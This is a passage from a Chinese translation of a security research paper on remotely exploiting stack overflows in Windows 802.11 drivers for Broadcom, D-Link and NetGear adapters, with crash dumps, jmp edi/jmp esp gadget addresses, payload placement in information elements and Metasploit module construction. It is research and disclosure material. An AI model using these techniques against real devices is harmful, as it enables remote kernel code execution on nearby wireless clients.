确实，这看起来就是原始数据包的一份完整副本。内存中之所以有这么多份该数据包的副本，可能与当前形式的利用正在以无限循环发送数据包这一事实有关，从而导致驱动程序在内存中留有几份副本。内存中存在多份副本这一事实是好消息，因为它增加了可被用作返回地址的位置数量。然而，考虑到池分配（pool allocation，内核池内存分配）的地址将是不可预测的，事情并不像把其中一个地址硬编码进利用里那么简单。相反，需要采取措施，尝试通过一个寄存器、或者通过某种其他上下文，找到一个指向该数据包的引用。这样一来，就可以把一小段非常短的桩代码放在缓冲区中返回地址之后，它会立即把控制转移到内存中别处的一份数据包副本里。虽然用调试器做的一些初步工作显示，栈上有几处指向原始数据包的引用，但人们找到了一个简单得多的解决方案。请看崩溃时下列寄存器上下文：

```
kd> r
Last set context:
eax=8055010d ebx=841b0000 ecx=00000000 edx=841b31f4 esi=841b000c edi=845f302e
eip=8055010e esp=805500fc ebp=8055010d iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
nt!KiDoubleFaultStack+0x2c8e:
8055010e cc              int     3
```

逐个检查这些寄存器，最终显示 `edi` 寄存器正指向数据包的一份副本。

```
kd> db edi
845f302e  00 07 0e 01 02 03 00 07-0e 01 02 03 10 cf 85 b1  ................
845f303e  b3 db 01 00 00 00 64 00-11 04 00 ff 4a 0d 01 55  ......d.....J..U
845f304e  80 0d 01 55 80 0d 01 55-80 0d 01 55 80 0d 01 55  ...U...U...U...U
```

碰巧的是，`edi` 正指向所发送的那个 802.11 数据包中的源 MAC。如果它指向的反而是目的 MAC 或者数据包的末尾，那它就派不上任何用场了。既然 `edi` 指向源 MAC，其余的牌就都顺势落位了〔译注：原文 “the rest of the cards fall into place”，直译为“其余的牌各就其位”，意为后续条件随之全部凑齐。〕此前用来覆写返回地址的那个硬编码栈地址，现在可以替换为一个地址（很可能位于 `ntoskrnl.exe`，即 Windows 内核映像文件之中），该地址处包含一条等效于 `jmp edi` 的指令。当利用被触发、存在漏洞的函数返回时，它将把控制转移到包含 `jmp edi` 的那个位置。`jmp edi` 反过来又把控制转移到源 MAC 的第一个字节。通过把源 MAC 设置为某种可执行代码，例如一条相对跳转指令，就有可能最终把控制转移到数据包中包含应被执行的任意代码的那个位置。

这就解决了把硬编码栈地址用作返回地址的问题，并应有助于使利用更可靠、且在不同目标之间更可移植。然而，这种可移植性将受到覆写返回地址时所用的那条 `jmp edi` 指令位置的限制。寻找一条 `jmp edi` 指令的位置相对简单，不过也可以采用更有效的措施来交叉引用地址，以期找到某种更可移植的东西。实验表明，`0x8066662c` 是一个可靠的位置：

```
kd> s nt L?10000000 ff e7
8063abce  ff e7 ff 21 47 70 21 83-98 03 00 00 eb 38 80 3d  ...!Gp!......8.=
806590ca  ff e7 ff 5f eb 05 bb 22-00 00 c0 8b ce e8 74 ff  ..._..."......t.
806590d9  ff e7 ff 5e 8b c3 5b c9-c2 08 00 cc cc cc cc cc  ...^..[.........
8066662c  ff e7 ff 8b d8 85 db 74-e0 33 d2 42 8b cb e8 d7  .......t.3.B....
806bb44b  ff e7 a3 6c ff a2 42 08-ff 3f 2a 1e f0 04 04 04  ...l..B..?*.....
...
```


利用至此已基本完成，还剩最后一个问题没有回答：任意代码应该放在 802.11 数据包的什么位置。处理这个问题有几种不同的办法。最简单的解法是直接把任意代码紧接在数据包里 SSID（Service Set Identifier，服务集标识符，即无线网络名）之后追加。然而，这会让数据包变得畸形（malformed），可能导致驱动把它丢弃。另一种办法是按本节前文的建议，用一个任意的信息元素（IE，Information Element），例如 WPA IE，作为任意代码的容器。目前，作者决定采取中间路线。默认情况下，所有载荷都用 WPA IE 作容器，不论载荷是否装得进这个 IE。这样做的效果是：所有小于 256 字节的载荷都能成为一个格式良好（well-formed）的数据包的一部分。大于 255 字节的载荷会使数据包变得畸形，但也许畸形程度还不至于让驱动把数据包丢弃。这个问题的另一种解法可以在 NetGear 案例研究中找到。

至此，缓冲区以及数据包整体的结构都已研究透彻，可以着手测试了。剩下的唯一工作，就是把 4.1 节描述的任意代码纳入进来。为了做出一个可靠的利用，作者在调试与改进所用代码上花了大量时间。

### 5.2 D-Link（D-Link 案例）

Broadcom 利用代码完成之后不久，作者们决定编写一套 fuzzing（模糊测试，即向目标程序大量发送随机或半随机畸形数据，以触发未预期崩溃与漏洞的测试方法）模块套件，以便在其他无线驱动中发现类似问题。这一过程的第一个受害者，是 D-Link DWL-G132 USB 无线适配器随附提供的 A5AGU.SYS 驱动。作者们对测试机（Windows XP SP2）进行了配置，使系统崩溃转储（crash dump，系统蓝屏时保存的内存快照文件）中包含内核内存的完整快照。这样可以确保崩溃发生时，转储中有足够有用的信息来调试问题。接着，安装了目标设备的最新驱动（v1.0.1.41）。最后，启动 beacon（信标帧，802.11 中接入点周期性广播的管理帧）模糊测试模块，并将网卡插入测试系统的 USB 端口。五秒钟后，一块漂亮的蓝屏出现了，与此同时崩溃转储被写入磁盘。

```
DRIVER_IRQL_NOT_LESS_OR_EQUAL (d1)
An attempt was made to access a pageable (or completely invalid) address at an
interrupt request level (IRQL) that is too high.  This is usually
caused by drivers using improper addresses.
If kernel debugger is available get stack backtrace.
Arguments:
Arg1: 56149a1b, memory referenced
Arg2: 00000002, IRQL
Arg3: 00000000, value 0 = read operation, 1 = write operation
Arg4: 56149a1b, address which referenced memory

ErrCode = 00000000
eax=00000000 ebx=82103ce0 ecx=00000002 edx=82864dd0 esi=f24105dc edi=8263b7a6
eip=56149a1b esp=80550658 ebp=82015000 iopl=0         nv up ei ng nz ac pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010296
56149a1b ??              ???
Resetting default scope

LAST_CONTROL_TRANSFER:  from 56149a1b to 804e2158

FAILED_INSTRUCTION_ADDRESS: 
+56149a1b
56149a1b ??              ???

STACK_TEXT:  
805505e4 56149a1b badb0d00 82864dd0 00000000 nt!KiTrap0E+0x233
80550654 82015000 82103ce0 81f15e10 8263b79c 0x56149a1b
80550664 f2408d54 81f15e10 82103c00 82015000 0x82015000
80550694 f24019cc 82015000 82103ce0 82015000 A5AGU+0x28d54
805506b8 f2413540 824ff008 0000000b 82015000 A5AGU+0x219cc
805506d8 f2414fae 824ff008 0000000b 0000000c A5AGU+0x33540
805506f4 f24146ae f241d328 8263b760 81f75000 A5AGU+0x34fae
80550704 f2417197 824ff008 00000001 8263b760 A5AGU+0x346ae
80550728 804e42cc 00000000 821f0008 00000000 A5AGU+0x37197
80550758 f74acee5 821f0008 822650a8 829fb028 nt!IopfCompleteRequest+0xa2
805507c0 f74adb57 8295a258 00000000 829fb7d8 USBPORT!USBPORT_CompleteTransfer+0x373
805507f0 f74ae754 026e6f44 829fb0e0 829fb0e0 USBPORT!USBPORT_DoneTransfer+0x137
80550828 f74aff6a 829fb028 804e3579 829fb230 USBPORT!USBPORT_FlushDoneTransferList+0x16c
80550854 f74bdfb0 829fb028 804e3579 829fb028 USBPORT!USBPORT_DpcWorker+0x224
80550890 f74be128 829fb028 00000001 80559580 USBPORT!USBPORT_IsrDpcWorker+0x37e
805508ac 804dc179 829fb64c 6b755044 00000000 USBPORT!USBPORT_IsrDpc+0x166
805508d0 804dc0ed 00000000 0000000e 00000000 nt!KiRetireDpcList+0x46
805508d4 00000000 0000000e 00000000 00000000 nt!KiIdleLoop+0x26
```

五秒钟的模糊测试就产生了一个缺陷，使获取指令指针（instruction pointer，即 eip 寄存器，决定 CPU 下一条执行指令地址的寄存器）的控制权成为可能。然而，为了执行任意代码，还必须找到一个指向恶意帧的上下文引用（contextual reference）。在这一案例中，edi 寄存器正好指向该帧的源地址（source address）字段，其方式与 Broadcom 漏洞中的情形完全相同。那个伪造的 eip 值可以在源地址之后、人们预料它会出现的地方找到——就在某个随机生成的信息元素（information element，简称 IE，802.11 管理帧中以“类型—长度—值”形式编码的可变长字段）内部。

```
kd> dd 0x8263b7a6 (edi)
8263b7a6  f3793ee8 3ee8a34e a34ef379 6eb215f0
8263b7b6  fde19019 006431d8 9b001740 63594364
```

```
kd> s 0x8263b7a6 Lffff 0x1b 0x9a 0x14 0x56
8263bd2b  1b 9a 14 56 2a 85 56 63-00 55 0c 0f 63 6e 17 51  ...V*.Vc.U..cn.Q
```

下一步是确定到底是哪一个信息元素导致了崩溃。在对内存中版本的帧进行解码之后，反复进行了一系列修改与重传，直到找到导致崩溃的那个特定信息元素为止。通过这种方法，最终确定：一个过长的 Supported Rates（支持速率）信息元素——即 802.11 帧中列出终端所支持传输速率的信息元素——触发了上文崩溃中所显示的栈溢出（stack overflow，写入栈上缓冲区的数据超出其容量、覆盖相邻栈数据包括返回地址的漏洞）。

利用这一缺陷，需要在内存中找到一个返回地址，它指向一条 `jmp edi`、`call edi` 或 `push edi; ret` 指令序列。实现这一点的方法是：对目标的 ntoskrnl.exe 运行 Metasploit Framework（一个开源的漏洞利用与测试框架）附带的 msfpescan 应用。由此得到的结果地址还必须加以调整，以计入内核的基址（base address）。为这一版本的 ntoskrnl.exe 选定的地址是 0x804f16eb（0x800d7000 + 0x0041a6eb）。

```
$ msfpescan ntoskrnl.exe -j edi
[ntoskrnl.exe]
0x0040365d push edi; retn 0x0001
0x00405aab call edi
0x00409d56 push edi; ret
0x0041a6eb jmp edi
```

最后，这个魔术帧（magic frame，指经过精心构造、足以触发漏洞并完成利用的特制帧）被改造成 Metasploit Framework 3.0 版的一个利用模块。当该利用启动时，栈溢出发生，返回地址被覆盖为一条 `jmp edi` 所在的位置，该指令进而落到该帧的源地址上。源地址被修改成一条合法的 x86 相对跳转（relative jump），从而将执行引导到第一个信息元素的正文之中。802.11b 的最大 MTU（Maximum Transmission Unit，最大传输单元，即一帧可承载的最大数据量）超过 2300 字节，使得有效载荷（payload，利用成功后执行的代码或数据）可达 1000 字节而不致遇到可靠性问题。由于这一利用是发送到广播地址（broadcast address）的，攻击者覆盖范围内的所有易受攻击的客户端都会被单个帧利用。

### 5.3 NetGear（NetGear 案例）

在接下来的测试中，作者们选择了 NetGear 的 WG111v2 USB 无线适配器。D-Link 利用时所用的那台机器被复用于这次测试（Windows XP SP2）。安装了 WG111v2.SYS 驱动的最新版本（v5.1213.6.316），启动了 beacon 模糊测试器，并将适配器连接到测试系统。大约十秒钟后，系统崩溃，又一块华丽的蓝屏出现了。

```
DRIVER_IRQL_NOT_LESS_OR_EQUAL (d1)
An attempt was made to access a pageable (or completely invalid) address at an
interrupt request level (IRQL) that is too high.  This is usually
caused by drivers using improper addresses.
If kernel debugger is available get stack backtrace.
Arguments:
Arg1: dfa6e83c, memory referenced
Arg2: 00000002, IRQL
Arg3: 00000000, value 0 = read operation, 1 = write operation
Arg4: dfa6e83c, address which referenced memory

ErrCode = 00000000
eax=80550000 ebx=825c700c ecx=00000005 edx=f30e0000 esi=82615000 edi=825c7012
eip=dfa6e83c esp=80550684 ebp=b90ddf78 iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
dfa6e83c ??              ???
Resetting default scope

LAST_CONTROL_TRANSFER:  from dfa6e83c to 804e2158

FAILED_INSTRUCTION_ADDRESS: 
+ffffffffdfa6e83c
dfa6e83c ??              ???

STACK_TEXT:  
80550610 dfa6e83c badb0d00 f30e0000 0b9e1a2b nt!KiTrap0E+0x233
WARNING: Frame IP not in any known module. Following frames may be wrong.
80550680 79e1538d 14c4f76f 8c1cec8e ea20f5b9 0xdfa6e83c
80550684 14c4f76f 8c1cec8e ea20f5b9 63a92305 0x79e1538d
80550688 8c1cec8e ea20f5b9 63a92305 115cab0c 0x14c4f76f
8055068c ea20f5b9 63a92305 115cab0c c63e58cc 0x8c1cec8e
80550690 63a92305 115cab0c c63e58cc 6d90e221 0xea20f5b9
80550694 115cab0c c63e58cc 6d90e221 78d94283 0x63a92305
80550698 c63e58cc 6d90e221 78d94283 2b828309 0x115cab0c
8055069c 6d90e221 78d94283 2b828309 39d51a89 0xc63e58cc
805506a0 78d94283 2b828309 39d51a89 0f8524ea 0x6d90e221
805506a4 2b828309 39d51a89 0f8524ea c8f0583a 0x78d94283
805506a8 39d51a89 0f8524ea c8f0583a 7e98cd49 0x2b828309
805506ac 0f8524ea c8f0583a 7e98cd49 214b52ab 0x39d51a89
805506b0 c8f0583a 7e98cd49 214b52ab 139ef137 0xf8524ea
805506b4 7e98cd49 214b52ab 139ef137 a7693fa7 0xc8f0583a
805506b8 214b52ab 139ef137 a7693fa7 dfad502f 0x7e98cd49
805506bc 139ef137 a7693fa7 dfad502f 81212de6 0x214b52ab
805506c0 a7693fa7 dfad502f 81212de6 c46a3b2e 0x139ef137
805507c0 f74a1b57 825f1e40 00000000 829a87d8 0xa7693fa7
805507f0 f74a2754 026e6f44 829a80e0 829a80e0 USBPORT!USBPORT_DoneTransfer+0x137
80550828 f74a3f6a 829a8028 804e3579 829a8230 USBPORT!USBPORT_FlushDoneTransferList+0x16c
80550854 f74b1fb0 829a8028 804e3579 829a8028 USBPORT!USBPORT_DpcWorker+0x224
80550890 f74b2128 829a8028 00000001 80559580 USBPORT!USBPORT_IsrDpcWorker+0x37e
805508ac 804dc179 829a864c 6b755044 00000000 USBPORT!USBPORT_IsrDpc+0x166
805508d0 804dc0ed 00000000 0000000e 00000000 nt!KiRetireDpcList+0x46
805508d4 00000000 0000000e 00000000 00000000 nt!KiIdleLoop+0x26
```

这次崩溃表明，模糊测试器不仅夺取了驱动执行地址的控制权，整个栈帧（stack frame，函数调用时在栈上为局部变量、保存寄存器与返回地址划出的一块区域）也被砸毁（smashed）了。esp 寄存器（栈指针寄存器）指向该帧内部大约一千字节深处，而那个伪造的 eip 值则位于另一个受控区域内部。

```
kd> dd 80550684
80550684  79e1538d 14c4f76f 8c1cec8e ea20f5b9
80550694  63a92305 115cab0c c63e58cc 6d90e221
```

```
kd> s 0x80550600 Lffff 0x3c 0xe8 0xa6 0xdf
80550608  3c e8 a6 df 10 06 55 80-78 df 0d b9 3c e8 a6 df  <.....U.x...<...
80550614  3c e8 a6 df 00 0d db ba-00 00 0e f3 2b 1a 9e 0b  <...........+...
80550678  3c e8 a6 df 08 00 00 00-46 02 01 00 8d 53 e1 79  <.......F....S.y
8055a524  3c e8 a6 df 02 00 00 00-00 00 00 00 3c e8 a6 df  <...........<...
8055a530  3c e8 a6 df 00 40 00 e1-00 00 00 00 00 00 00 00  <....@..........
```

分析这个 bug 所花的时间远比人们可能预想的要多。令人惊讶的是，并不存在某一个单独的字段或信息元素来触发这一缺陷。只要 SSID（Service Set Identifier，服务集标识符，即无线网络名称）、Supported Rates 和 Channel（信道）信息元素位于开头，任何总长度大于 1100 字节的一系列信息元素都会触发该溢出。驱动会丢弃任何 IE 链（IE chain，帧中顺序排列的多个信息元素组成的序列）被截断、或延伸超出所接收帧边界的帧。这一点很招人烦，因为有效载荷的长度和内容可以是任意的，未必能整齐地装进一个 255 字节的数据块中（单个 IE 的最大长度）。解决办法是：把那一大团填充数据（padding）与 shellcode（利用代码中直接以机器码形式执行的小段载荷代码）当作一条连续的 IE 链来处理，并根据帧的内容和长度对缓冲区进行填充。利用代码会生成该缓冲区，然后像遍历一系列 IE 那样遍历这个缓冲区，再通过随机化填充来扩展最末尾的那个 IE。这样得到的就是一条由垃圾信息元素组成的链，它能通过驱动的健全性检查（sanity checks），并允许干净利落地完成利用。

对于这个 bug，esp 寄存器是唯一指向受控数据的寄存器。这又引入了另一个问题——在易受攻击的函数返回之前，它修改了栈变量，并使该帧的某些部分处于损坏状态。尽管 esp 所指向的区域是稳定的，但在它之后紧挨着存在一个已损坏的块。为了解决这个问题，利用代码中加入了一小块汇编代码，当它被执行时，会通过以 eax 寄存器为基准计算偏移量，跳转到真正的有效载荷处。找到一条 `jmp esp` 指令则简单得很：只需对 ntoskrnl.exe 运行 msfpescan，并按内核基址对其加以调整即可。为这一版本的 ntoskrnl.exe 选定的地址是 0x804ed5cb（0x800d7000 + 0x004165cb）。

```
$ msfpescan ntoskrnl.exe -j esp
[ntoskrnl.exe]
0x004165cb jmp esp
```

> 译注：原文在分析 NetGear bug 的段落中将 “Surprisingly” 误拼为 “Suprisingly”，属原文笔误，此处按正确含义照译为“令人惊讶的是”，特此标注，未擅自改动原意。

## 6) Conclusion / 结论

可用于帮助防止用户态漏洞被利用的技术，如今在现代桌面平台上正变得司空见惯。这代表着一项显著的进步，从长远来看，它应当会使许多用户态漏洞的利用变得困难得多、甚至成为不可能。话虽如此，却明显缺乏能够帮助防止内核态漏洞被利用的同等技术。公众为缺乏同等技术给出的理由，通常围绕着这样一个论点：内核态漏洞难以利用，而且数量太少，实际上不值得为此集成漏洞利用防范功能。实际上，尽管听起来令人遗憾，这一理由归根结底其实是一个商业成本问题。目前，内核态漏洞在收入损失方面所占的金额，还不足以支撑实现和测试内核态漏洞利用防范功能所需的时间投入。

为了帮助平衡这一商业成本等式，作者描述了一套可用于在 Windows 上识别并利用 802.11 无线设备驱动程序漏洞的流程。这一流程包括可采取的步骤，对 802.11 设备驱动程序处理 802.11 数据包的不同方式进行模糊测试（fuzz）。在某些情况下，可能会在某个特定设备驱动程序对某些数据包——例如 Beacon 请求和 Probe 响应——的处理中检测到缺陷。当这些缺陷被检测到时，可以利用已集成到 Metasploit Framework 3.0 版本中的功能来开发漏洞利用程序，这些功能有助于简化发送精心构造的 802.11 数据包以获取代码执行的过程。

通过对这一流程的描述，希望读者能够看到，内核态漏洞完全可以像用户态漏洞一样容易被识别和利用。此外，希望这一描述将有助于消除一种错误印象，即所有内核态漏洞都比用户态漏洞难利用得多（当然也要记住，确实存在难以利用的内核态漏洞，正如确实存在难以利用的用户态漏洞一样）。虽然本文重点放在 802.11 无线设备驱动程序上，但许多不同的设备驱动程序都有暴露漏洞的可能。展望未来，无论从攻击还是防御的角度来看，都有许多不同的研究机会。

从攻击的角度来看，有趣的研究课题不胜枚举。就 802.11 无线设备驱动程序漏洞而言，可以开发出远为先进的 802.11 协议模糊测试器（fuzzer），使其能够触及协议所有客户端状态所暴露的功能，而不是只聚焦于未认证和未关联状态。就设备驱动程序整体而言，开发攻击设备对象所暴露的 IOCTL 接口的模糊测试器，将为深入了解范围广泛的本地暴露漏洞提供良好的洞见。除了用于识别漏洞的技术之外，预计用于实际利用不同类型内核态漏洞的技术研究将继续演进，并变得更加可靠。从防御的角度来看，明确需要开展专注于使内核态漏洞的利用变得不可能或不那么可靠的研究。内核态漏洞的未来将走向何方，值得拭目以待。

## Bibliography / 参考文献

[1] bugcheck and skape. Windows Kernel-mode Payload Fundamentals.
    http://www.uninformed.org/?v=3&a=4&t=sumry;
    访问于 2006 年 12 月 2 日（accessed Dec 2, 2006）。

[2] eEye. Remote Windows Kernel Exploitation - Step Into the Ring 0.
    http://research.eeye.com/html/Papers/download/StepIntoTheRing.pdf;
    访问于 2006 年 12 月 2 日（accessed Dec 2, 2006）。

[3] Gast, Matthew S. 802.11 Wireless Networks - The Definitive Guide.
    http://www.oreilly.com/catalog/802dot11/;
    访问于 2006 年 12 月 2 日（accessed Dec 2, 2006）。

[4] Lemos, Robert. Device drivers filled with flaws, threaten security.
    http://www.securityfocus.com/news/11189;
    访问于 2006 年 12 月 2 日（accessed Dec 2, 2006）。

[5] SoBeIt. Windows Kernel Pool Overflow Exploitation.
    http://xcon.xfocus.org/xcon2005/archives/2005/Xcon2005_SoBeIt.pdf;
    访问于 2006 年 12 月 2 日（accessed Dec 2, 2006）。

（全文完）
